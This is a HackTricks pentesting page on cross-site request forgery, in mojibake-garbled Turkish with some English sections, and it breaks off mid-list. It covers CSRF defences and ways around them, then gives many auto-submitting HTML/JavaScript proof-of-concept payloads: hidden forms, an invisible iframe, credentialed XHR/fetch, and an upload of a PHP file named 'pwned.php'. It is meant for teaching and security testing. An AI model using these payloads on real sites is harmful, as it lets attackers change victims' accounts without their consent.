# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan kahraman seviyesine yÃ¼kseltin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **katkÄ±da bulunun**.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ±yla iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± ele alan iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avlarÄ± baÅŸlatma ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!


## Cross-Site Request Forgery (CSRF) AÃ§Ä±klamasÄ±

**Cross-Site Request Forgery (CSRF)**, web uygulamalarÄ±nda bulunan bir gÃ¼venlik aÃ§Ä±ÄŸÄ± tÃ¼rÃ¼dÃ¼r. Bu aÃ§Ä±k, kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ oturumlarÄ± sÃ¶mÃ¼rerek, saldÄ±rganlarÄ±n masum kullanÄ±cÄ±lar adÄ±na eylemler gerÃ§ekleÅŸtirmesine olanak tanÄ±r. SaldÄ±rÄ±, bir kullanÄ±cÄ±nÄ±n, bir kurbanÄ±n platformuna giriÅŸ yapmÄ±ÅŸken, kÃ¶tÃ¼ niyetli bir siteyi ziyaret etmesiyle gerÃ§ekleÅŸtirilir. Bu site, JavaScript Ã§alÄ±ÅŸtÄ±rarak, form gÃ¶ndererek veya resimleri alarak kurbanÄ±n hesabÄ±na istekler gÃ¶nderir.

### CSRF SaldÄ±rÄ±sÄ± iÃ§in Ã–nkoÅŸullar
CSRF aÃ§Ä±ÄŸÄ±ndan yararlanmak iÃ§in birkaÃ§ koÅŸulun saÄŸlanmasÄ± gerekmektedir:

1. **DeÄŸerli Bir Eylem Belirleme**: SaldÄ±rgan, kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirme, e-postasÄ±nÄ± deÄŸiÅŸtirme veya ayrÄ±calÄ±klarÄ±nÄ± yÃ¼kseltme gibi sÃ¶mÃ¼rÃ¼lebilecek bir eylem bulmalÄ±dÄ±r.
2. **Oturum YÃ¶netimi**: KullanÄ±cÄ±nÄ±n oturumu yalnÄ±zca Ã§erezler veya HTTP Temel Kimlik DoÄŸrulama baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla yÃ¶netilmelidir, diÄŸer baÅŸlÄ±klar bu amaÃ§la manipÃ¼le edilemez.
3. **Tahmin Edilemez Parametrelerin OlmamasÄ±**: Ä°stek, saldÄ±rÄ±yÄ± engelleyebilecek tahmin edilemez parametreler iÃ§ermemelidir.

### CSRF'ye KarÅŸÄ± Savunma
CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± birkaÃ§ karÅŸÄ± Ã¶nlem alÄ±nabilir:

* [**SameSite Ã§erezleri**](hacking-with-cookies/#samesite): Bu Ã¶zellik, tarayÄ±cÄ±nÄ±n Ã§erezleri Ã§apraz site istekleriyle birlikte gÃ¶ndermesini engeller. [SameSite Ã§erezleri hakkÄ±nda daha fazla bilgi](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): Kurban sitesinin CORS politikasÄ±, saldÄ±rÄ±nÄ±n gerÃ§ekleÅŸtirilebilirliÄŸini etkileyebilir, Ã¶zellikle saldÄ±rÄ±nÄ±n kurban sitesinden gelen yanÄ±tÄ± okumayÄ± gerektirdiÄŸi durumlarda. [CORS bypass hakkÄ±nda bilgi edinin](cors-bypass.md).
* **KullanÄ±cÄ± DoÄŸrulama**: KullanÄ±cÄ±nÄ±n niyetini doÄŸrulamak iÃ§in ÅŸifresini sormak veya bir captcha Ã§Ã¶zmek kullanÄ±labilir.
* **Referrer veya Origin BaÅŸlÄ±klarÄ±nÄ± Kontrol Etme**: Bu baÅŸlÄ±klarÄ± doÄŸrulamak, isteklerin gÃ¼venilir kaynaklardan geldiÄŸinden emin olmaya yardÄ±mcÄ± olabilir. Ancak, URL'lerin dikkatsizce oluÅŸturulmasÄ±yla kÃ¶tÃ¼ bir ÅŸekilde uygulanmÄ±ÅŸ kontrolleri atlatmak mÃ¼mkÃ¼n olabilir, Ã¶rneÄŸin:
- `http://mal.net?orig=http://example.com` (URL gÃ¼venilir URL ile biter)
- `http://example.com.mal.net` (URL gÃ¼venilir URL ile baÅŸlar)
* **Parametre Ä°simlerini DeÄŸiÅŸtirme**: POST veya GET isteklerindeki parametre isimlerini deÄŸiÅŸtirmek, otomatik saldÄ±rÄ±larÄ± Ã¶nlemeye yardÄ±mcÄ± olabilir.
* **CSRF Token'larÄ±**: Her oturuma benzersiz bir CSRF token eklemek ve bu token'Ä± sonraki isteklerde gerektirmek, CSRF riskini Ã¶nemli Ã¶lÃ§Ã¼de azaltabilir. Token'Ä±n etkinliÄŸi, CORS'un zorunlu kÄ±lÄ±nmasÄ±yla artÄ±rÄ±labilir.

Bu savunmalarÄ± anlamak ve uygulamak, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini ve bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ saÄŸlamak iÃ§in Ã¶nemlidir.

## Savunma Bypass

### POST'tan GET'e

SÃ¶mÃ¼rmek istediÄŸiniz formun bir **CSRF token ile POST isteÄŸi gÃ¶ndermeye hazÄ±rlandÄ±ÄŸÄ±nÄ±** belki de kontrol etmelisiniz, ancak bir **GET** isteÄŸinin de **geÃ§erli** olup olmadÄ±ÄŸÄ±nÄ± ve GET isteÄŸi gÃ¶nderdiÄŸinizde **CSRF token'Ä±n hala doÄŸrulandÄ±ÄŸÄ±nÄ±** kontrol etmelisiniz.

### Token eksikliÄŸi

Uygulamalar, token'lar var olduÄŸunda bunlarÄ± **doÄŸrulamak iÃ§in bir mekanizma** uygulayabilir. Ancak, token yokken doÄŸrulama tamamen atlanÄ±yorsa bir gÃ¼venlik aÃ§Ä±ÄŸÄ± ortaya Ã§Ä±kar. SaldÄ±rganlar, token'Ä± taÅŸÄ±yan parametreyi sadece deÄŸerini deÄŸil, tamamen kaldÄ±rarak bu doÄŸrulama sÃ¼recini atlayabilir. Bu, Cross-Site Request Forgery (CSRF) saldÄ±rÄ±sÄ±nÄ± etkili bir ÅŸekilde gerÃ§ekleÅŸtirmelerine olanak tanÄ±r.

### CSRF token'Ä± kullanÄ±cÄ± oturumuna baÄŸlÄ± deÄŸil

CSRF token'larÄ±nÄ± kullanÄ±cÄ± oturumlarÄ±na baÄŸlamayan uygulamalar Ã¶nemli bir gÃ¼venlik riski oluÅŸturur. Bu sistemler, her tokenin baÅŸlatan oturuma baÄŸlÄ± olduÄŸunu saÄŸlamak yerine tokenlarÄ± bir **genel havuzda** doÄŸrular.

SaldÄ±rganlar bunu nasÄ±l sÃ¶mÃ¼rÃ¼r:

1. Kendi hesaplarÄ±nÄ± kullanarak **kimlik doÄŸrulama** yaparlar.
2. **Genel havuzdan geÃ§erli bir CSRF token** alÄ±rlar.
3. Bu token'Ä± bir kurban Ã¼zerindeki CSRF saldÄ±rÄ±sÄ±nda **kullanÄ±rlar**.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, uygulamanÄ±n **yetersiz token doÄŸrulama mekanizmasÄ±nÄ±** sÃ¶mÃ¼rerek saldÄ±rganlarÄ±n kurban adÄ±na yetkisiz istekler yapmasÄ±na olanak tanÄ±r.

### YÃ¶ntem atlatma

EÄŸer istek "**garip**" bir **yÃ¶ntem** kullanÄ±yorsa, **yÃ¶ntem geÃ§ersizleÅŸtirme iÅŸlevinin** Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol edin.
Ã–rneÄŸin, **PUT** yÃ¶ntemi kullanÄ±lÄ±yorsa, **POST** yÃ¶ntemini deneyebilir ve ÅŸunu gÃ¶nderebilirsiniz: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Bu ayrÄ±ca **\_method parametresini bir POST isteÄŸi iÃ§ine yerleÅŸtirerek** veya **baÅŸlÄ±klarÄ± kullanarak** Ã§alÄ±ÅŸabilir:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Ã–
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Not et ki, **csrf belirteci oturum Ã§ereziyle iliÅŸkiliyse bu saldÄ±rÄ± Ã§alÄ±ÅŸmayacaktÄ±r** Ã§Ã¼nkÃ¼ kurbanÄ±n oturumunu ayarlamanÄ±z gerekecek ve bu nedenle kendinize saldÄ±rÄ± yapmÄ±ÅŸ olacaksÄ±nÄ±z.
{% endhint %}

### Content-Type deÄŸiÅŸikliÄŸi

[**Burada**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) belirtildiÄŸi gibi, **POST** yÃ¶ntemini kullanarak **Ã¶niÅŸlem** isteklerini Ã¶nlemek iÃ§in izin verilen Content-Type deÄŸerleri ÅŸunlardÄ±r:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Ancak, **sunucunun mantÄ±ÄŸÄ±** kullanÄ±lan **Content-Type**'a baÄŸlÄ± olarak deÄŸiÅŸebilir, bu nedenle bahsedilen deÄŸerleri ve **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ gibi diÄŸer deÄŸerleri denemelisiniz.

Ã–rnek (buradan alÄ±nmÄ±ÅŸtÄ±r: [buradan](https://brycec.me/posts/corctf\_2021\_challenges)) JSON verilerini text/plain olarak gÃ¶nderme:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### JSON Verileri iÃ§in Preflight Ä°steklerini Atlatma

JSON verilerini POST isteÄŸi aracÄ±lÄ±ÄŸÄ±yla gÃ¶ndermeye Ã§alÄ±ÅŸÄ±rken, HTML formunda `Content-Type: application/json` kullanmak doÄŸrudan mÃ¼mkÃ¼n deÄŸildir. Benzer ÅŸekilde, bu iÃ§erik tÃ¼rÃ¼nÃ¼ kullanarak `XMLHttpRequest` kullanmak bir Ã¶n uÃ§uÅŸ isteÄŸi baÅŸlatÄ±r. Bununla birlikte, sunucunun Content-Type'dan baÄŸÄ±msÄ±z olarak JSON verilerini iÅŸleyip iÅŸlemediÄŸini kontrol etmek iÃ§in bu sÄ±nÄ±rlamayÄ± potansiyel olarak atlamak iÃ§in stratejiler vardÄ±r:

1. **Alternatif Ä°Ã§erik TÃ¼rleri Kullanma**: Formda `enctype="text/plain"` olarak ayarlayarak `Content-Type: text/plain` veya `Content-Type: application/x-www-form-urlencoded` kullanÄ±n. Bu yaklaÅŸÄ±m, sunucunun Content-Type'dan baÄŸÄ±msÄ±z olarak veriyi kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± test eder.

2. **Ä°Ã§erik TÃ¼rÃ¼nÃ¼ DeÄŸiÅŸtirme**: Bir Ã¶n uÃ§uÅŸ isteÄŸi tetiklemeden, sunucunun iÃ§eriÄŸi JSON olarak tanÄ±masÄ±nÄ± saÄŸlamak iÃ§in veriyi `Content-Type: text/plain; application/json` ile gÃ¶nderebilirsiniz. Bu, bir Ã¶n uÃ§uÅŸ isteÄŸi baÅŸlatmaz, ancak sunucu `application/json`'Ä± kabul etmek iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸsa doÄŸru ÅŸekilde iÅŸleyebilir.

3. **SWF Flash DosyasÄ± KullanÄ±mÄ±**: Daha az yaygÄ±n ancak mÃ¼mkÃ¼n olan bir yÃ¶ntem, bu tÃ¼r kÄ±sÄ±tlamalarÄ± atlamak iÃ§in bir SWF flash dosyasÄ± kullanmaktÄ±r. Bu teknik hakkÄ±nda daha ayrÄ±ntÄ±lÄ± bilgi iÃ§in [bu yazÄ±ya](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937) baÅŸvurun.

### Referrer / Origin KontrolÃ¼nÃ¼ Atlama

**Referrer BaÅŸlÄ±ÄŸÄ±nÄ± Engelleme**

Uygulamalar, 'Referer' baÅŸlÄ±ÄŸÄ±nÄ± yalnÄ±zca var olduÄŸunda doÄŸrulayabilir. TarayÄ±cÄ±nÄ±n bu baÅŸlÄ±ÄŸÄ± gÃ¶ndermesini engellemek iÃ§in aÅŸaÄŸÄ±daki HTML meta etiketi kullanÄ±labilir:
```xml
<meta name="referrer" content="never">
```
Bu, bazÄ± uygulamalardaki doÄŸrulama kontrollerini atlayarak 'Referer' baÅŸlÄ±ÄŸÄ±nÄ±n atlanmasÄ±nÄ± saÄŸlar.

**Regexp atlatmalarÄ±**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrer'Ä±n iÃ§indeki parametrelerle birlikte gÃ¶ndereceÄŸi URL'de sunucunun alan adÄ±nÄ± ayarlamak iÃ§in ÅŸunu yapabilirsiniz:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD yÃ¶ntemi bypass**

[**Bu CTF Ã§Ã¶zÃ¼mÃ¼nde**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) ilk bÃ¶lÃ¼mde, [Oak'in kaynak kodunda](https://github.com/oakserver/oak/blob/main/router.ts#L281), bir yÃ¶nlendirici **HEAD isteklerini GET istekleri olarak iÅŸlemlemek Ã¼zere ayarlanmÄ±ÅŸ** - bu, Oak'e Ã¶zgÃ¼ olmayan yaygÄ±n bir Ã§Ã¶zÃ¼m yÃ¶ntemidir. HEAD isteklerini iÅŸleyen Ã¶zel bir iÅŸleyici yerine, bunlar sadece GET iÅŸleyiciye verilir ve uygulama yanÄ±t gÃ¶vdesini kaldÄ±rÄ±r.

Bu nedenle, eÄŸer bir GET isteÄŸi sÄ±nÄ±rlanÄ±yorsa, sadece **GET isteÄŸi olarak iÅŸlenecek bir HEAD isteÄŸi gÃ¶nderebilirsiniz**.

## **Exploit Ã–rnekleri**

### **CSRF Token'inin Exfiltrasyonu**

EÄŸer bir **CSRF tokeni** savunma olarak kullanÄ±lÄ±yorsa, [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) zafiyeti veya [**Dangling Markup**](dangling-markup-html-scriptless-injection/) zafiyeti kullanarak onu **exfiltrate** etmeyi deneyebilirsiniz.

### **HTML etiketleri kullanarak GET isteÄŸi**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
DiÄŸer HTML5 etiketleri, otomatik olarak bir GET isteÄŸi gÃ¶ndermek iÃ§in kullanÄ±labilir:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Form GET isteÄŸi

Form GET isteÄŸi, bir web formu aracÄ±lÄ±ÄŸÄ±yla verilerin sunucuya gÃ¶nderilmesi iÃ§in kullanÄ±lan bir HTTP isteÄŸi tÃ¼rÃ¼dÃ¼r. Bu istek, URL'nin bir parÃ§asÄ± olarak verileri taÅŸÄ±r ve sunucuya gÃ¶nderilir. Form GET isteÄŸi, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda URL'nin deÄŸiÅŸmesine neden olur ve bu nedenle tarayÄ±cÄ±nÄ±n geÃ§miÅŸinde gÃ¶rÃ¼ntÃ¼lenebilir.

Form GET isteÄŸi, genellikle verilerin sunucuya gÃ¶nderilmesi gerektiÄŸinde kullanÄ±lÄ±r, ancak bu istek tÃ¼rÃ¼ gÃ¼venlik aÃ§Ä±klarÄ±na neden olabilir. Ã–zellikle Cross-Site Request Forgery (CSRF) saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±zlÄ±k oluÅŸturabilir.

CSRF saldÄ±rÄ±larÄ±, bir saldÄ±rganÄ±n kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda yetkilendirilmiÅŸ bir oturum aÃ§arak, kullanÄ±cÄ±nÄ±n istemeden istenmeyen iÅŸlemleri gerÃ§ekleÅŸtirmesine neden olmasÄ±nÄ± amaÃ§lar. Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda bir form GET isteÄŸi oluÅŸturarak, kullanÄ±cÄ±nÄ±n hesabÄ±nda istenmeyen deÄŸiÅŸiklikler yapabilir.

Bu nedenle, web uygulamalarÄ±nÄ±n CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± korunmasÄ± Ã¶nemlidir. Bu korumayÄ± saÄŸlamak iÃ§in, web uygulamalarÄ± genellikle CSRF token'larÄ± kullanÄ±r. CSRF token'larÄ±, her form isteÄŸi iÃ§in benzersiz bir deÄŸer iÃ§eren gizli bir alan olarak eklenir. Sunucu, form isteÄŸini alÄ±rken bu token'Ä± kontrol eder ve isteÄŸin gÃ¼venilir bir kaynaktan geldiÄŸini doÄŸrular.

Form GET isteÄŸi, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini saÄŸlamak iÃ§in dikkatlice ele alÄ±nmalÄ± ve gerekli Ã¶nlemler alÄ±nmalÄ±dÄ±r.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST isteÄŸi

Form POST isteÄŸi, bir web formu aracÄ±lÄ±ÄŸÄ±yla sunucuya veri gÃ¶ndermek iÃ§in kullanÄ±lan bir HTTP isteÄŸi tÃ¼rÃ¼dÃ¼r. Bu istek, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda doldurulan bir formun verilerini sunucuya iletmek iÃ§in kullanÄ±lÄ±r. Form POST isteÄŸi, genellikle kullanÄ±cÄ± tarafÄ±ndan yapÄ±lan bir eylem sonucunda tetiklenir, Ã¶rneÄŸin bir dÃ¼ÄŸmeye tÄ±klama veya bir formu gÃ¶nderme.

Form POST isteÄŸi, HTTP POST yÃ¶ntemini kullanÄ±r ve isteÄŸin gÃ¶vdesinde form verilerini taÅŸÄ±r. Bu veriler, formdaki alanlarÄ±n adÄ± ve deÄŸeri olarak temsil edilir. Sunucu, bu verileri alÄ±r ve iÅŸler, genellikle veritabanÄ±na kaydetmek veya baÅŸka bir iÅŸlem yapmak iÃ§in kullanÄ±lÄ±r.

Form POST isteÄŸi, Cross-Site Request Forgery (CSRF) saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olabilir. Bu tÃ¼r saldÄ±rÄ±lar, bir saldÄ±rganÄ±n kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda istenmeyen bir form POST isteÄŸi gÃ¶ndermesini saÄŸlayarak kullanÄ±cÄ±nÄ±n hesabÄ±nÄ± ele geÃ§irmesine veya yetkisiz iÅŸlemler yapmasÄ±na olanak tanÄ±r. Bu nedenle, web uygulamalarÄ±nÄ±n CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± korunmasÄ± iÃ§in uygun Ã¶nlemler almasÄ± Ã¶nemlidir.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Iframe Ã¼zerinden Form POST isteÄŸi

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a form through an invisible iframe. This technique is commonly used to perform unauthorized actions on behalf of the victim without their knowledge.

To execute this attack, the attacker creates a malicious webpage that contains an invisible iframe. The iframe is then loaded with a webpage that hosts a form. The form is pre-filled with the necessary data to perform the desired action, such as changing the victim's password or making a financial transaction.

When the victim visits the attacker's webpage, the iframe automatically submits the form without the victim's consent or knowledge. Since the victim is already authenticated to the targeted website, the request appears legitimate, and the action is executed.

To protect against this type of attack, web developers should implement measures such as using anti-CSRF tokens, which require a unique token to be included with each form submission. Additionally, users should be cautious when clicking on unfamiliar links or visiting suspicious websites to minimize the risk of falling victim to CSRF attacks.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST isteÄŸi**

Ajax POST isteÄŸi, web uygulamalarÄ±nda veri gÃ¶ndermek iÃ§in kullanÄ±lan bir tekniktir. Bu istek, kullanÄ±cÄ±nÄ±n farkÄ±nda olmadÄ±ÄŸÄ± bir ÅŸekilde gerÃ§ekleÅŸtirilebilir ve Cross-Site Request Forgery (CSRF) saldÄ±rÄ±larÄ± iÃ§in kullanÄ±labilir.

Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan hedef web uygulamasÄ±na bir istek gÃ¶nderirken, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda oturum aÃ§Ä±k olduÄŸu bir siteyi hedefler. Bu istek, kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ±nÄ± kullanarak gerÃ§ekleÅŸtirilir ve kullanÄ±cÄ±nÄ±n bilgisi olmadan yapÄ±lÄ±r.

SaldÄ±rgan, hedef web uygulamasÄ±nda bir form veya baÅŸka bir etkileÅŸimli Ã¶ÄŸe oluÅŸturarak, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda oturum aÃ§Ä±k olan bir siteye yÃ¶nlendirir. Bu Ã¶ÄŸe, saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir URL'ye bir POST isteÄŸi yapar. Bu istek, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda oturum aÃ§Ä±k olan siteye gÃ¶nderilir ve kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ± kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu saldÄ±rÄ± tÃ¼rÃ¼nden korunmanÄ±n bir yolu, web uygulamasÄ±nda CSRF token kullanmaktÄ±r. CSRF token, her istek iÃ§in benzersiz bir deÄŸerdir ve kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda saklanÄ±r. Bu token, istek gÃ¶nderilirken kontrol edilir ve isteÄŸin geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in kullanÄ±lÄ±r. Bu sayede, saldÄ±rganÄ±n CSRF saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmesi engellenir.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST isteÄŸi

Multipart/form-data POST isteÄŸi, web uygulamalarÄ±nda dosya yÃ¼kleme iÅŸlemlerini gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan bir HTTP isteÄŸi tÃ¼rÃ¼dÃ¼r. Bu istek tÃ¼rÃ¼, form verilerini ve dosyalarÄ± aynÄ± anda sunucuya gÃ¶ndermek iÃ§in kullanÄ±lÄ±r.

Bu istek tÃ¼rÃ¼, genellikle dosya yÃ¼kleme formlarÄ±nda kullanÄ±lÄ±r ve form verileri ve dosyalarÄ± ayrÄ± ayrÄ± parÃ§alara bÃ¶lerek gÃ¶nderir. Bu sayede sunucu, form verilerini ve dosyalarÄ± ayrÄ± ayrÄ± iÅŸleyebilir.

Multipart/form-data POST isteÄŸi, aÅŸaÄŸÄ±daki adÄ±mlarÄ± izler:

1. Ä°stek baÅŸlÄ±ÄŸÄ±na `Content-Type: multipart/form-data` eklenir.
2. Ä°stek gÃ¶vdesi, her bir form alanÄ± ve dosya iÃ§in ayrÄ± bir parÃ§a (part) olarak oluÅŸturulur.
3. Her bir parÃ§a, `Content-Disposition` baÅŸlÄ±ÄŸÄ± ile birlikte gÃ¶nderilir. Bu baÅŸlÄ±k, parÃ§anÄ±n tÃ¼rÃ¼nÃ¼ (form alanÄ± veya dosya), adÄ±nÄ± ve diÄŸer ilgili bilgileri iÃ§erir.
4. Her bir parÃ§a, `Content-Type` baÅŸlÄ±ÄŸÄ± ile birlikte gÃ¶nderilir. Bu baÅŸlÄ±k, parÃ§anÄ±n iÃ§eriÄŸinin tÃ¼rÃ¼nÃ¼ belirtir (Ã¶rneÄŸin, metin, resim, video).
5. Her bir parÃ§a, parÃ§anÄ±n iÃ§eriÄŸini iÃ§eren gÃ¶vdeyle birlikte gÃ¶nderilir.

Multipart/form-data POST isteÄŸi, dosya yÃ¼kleme iÅŸlemlerinde kullanÄ±lan yaygÄ±n bir yÃ¶ntemdir ve web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini deÄŸerlendirirken dikkate alÄ±nmasÄ± gereken bir konudur.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST isteÄŸi v2

Bu teknik, bir web uygulamasÄ±na multipart/form-data POST isteÄŸi gÃ¶ndererek Cross-Site Request Forgery (CSRF) saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lÄ±r. Bu saldÄ±rÄ±, bir kullanÄ±cÄ±nÄ±n istemeden veya farkÄ±nda olmadan istenmeyen bir eylemi gerÃ§ekleÅŸtirmesine neden olur.

#### SaldÄ±rÄ± AÅŸamalarÄ±

1. Hedef web uygulamasÄ±nÄ±n hedeflenen iÅŸlevselliÄŸi belirlenir.
